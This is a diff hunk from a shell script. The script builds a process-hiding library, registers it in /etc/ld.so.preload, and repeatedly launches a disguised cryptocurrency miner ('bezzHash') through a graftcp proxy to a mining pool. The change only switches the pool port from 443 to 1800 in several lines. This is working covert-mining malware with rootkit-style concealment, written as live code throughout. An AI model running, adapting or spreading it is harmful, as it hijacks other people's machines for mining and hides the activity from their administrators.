@@ -42,15 +42,15 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethw.poolbinance.com:443 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethw.poolbinance.com:1800 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
 
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethw.poolbinance.com:443 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethw.poolbinance.com:1800 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
 
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethw.poolbinance.com:443 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethw.poolbinance.com:1800 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
 
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethw.poolbinance.com:443 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethw.poolbinance.com:1800 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
 
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethw.poolbinance.com:443 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethw.poolbinance.com:1800 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
 
 ./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethw.poolbinance.com:443 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
 
